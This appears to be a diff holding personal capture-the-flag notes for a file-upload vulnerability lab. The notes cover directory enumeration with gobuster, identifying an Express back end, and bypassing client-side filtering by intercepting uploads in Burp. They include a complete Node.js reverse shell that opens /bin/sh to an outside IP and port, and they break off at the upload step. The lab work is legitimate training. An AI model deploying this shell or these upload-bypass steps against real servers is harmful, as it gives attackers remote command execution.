@@ -1,1 +1,61 @@
 
+jewel.uploadvulns.thm
+
+As per usual, your flag is in /var/www/
+
+page source shows - file at - /assets/title.svg
+
+uploaded legit image for test - apple.jpg
+
+ran gobuster to try and find it with provided wordlists
+
+gobuster dir -u http://jewel.uploadvulns.thm/Content/ -w uploadvulnwordlist.txt -x jpeg
+
+
+FF D8 FF EE
+
+JPEG MAGIC NUMBERS ABOVE
+
+/content
+/modules
+/admin
+/assets
+/Content
+/Assets
+/Modules
+/Admin      - web page exists - As a reminder: use this form to activate modules from the /modules directory (is what it says)
+
+gobuster dir -u http://jewel.uploadvulns.thm -w uploadvulnwordlist.txt -x jpeg
+
+using wappalyzer extension on admin page reveals that it is jQuery3.5.1
+
+-------------------------------------------------------------------------------
+
+we intercepted the request in burp suite on admin page - found that it was powered by express (node.js)
+
+we see that there is client side filtering (uploaded files are given a three letter name instead of original file name)
+
+
+so first of all grab the node js shell
+
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(4242, "10.10.132.71", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
+
+
+then we upload a legit jpg file to server but use burp to intercept the request
+
+convert the text of the node js to base64   - https://www.base64encode.org/
+
+
+
+
